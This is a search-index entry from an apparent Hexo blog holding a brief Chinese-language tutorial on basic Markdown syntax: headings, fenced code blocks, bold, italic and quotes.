    <content type="text"><![CDATA[MarkdownMarkdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档，然后转换成丰富的HTML页面。 Markdown用一些简单的符号标识不同的标题，将某些文章标记为”粗体“或者斜体，下面就来一起学习一下。 语法1、标题 不同的标题采用不等个数的#号来进行标记，如下所示： 1234# 一级标题## 二级标题### 三级标题#### 四级标题 2、代码块 在需要高亮的代码块的前一行及后一行使用三个反引号“`”，同时第一行反引号后面表面代码块所使用的语言, 如下： ```pyhtonprint (“Hello World!”)``` 3、特殊字符 123**粗体***斜体*&gt; 引用内容 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>Markdown</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>博客</tag>
        <tag>Markdown</tag>
      </tags>
  </entry>
</search>
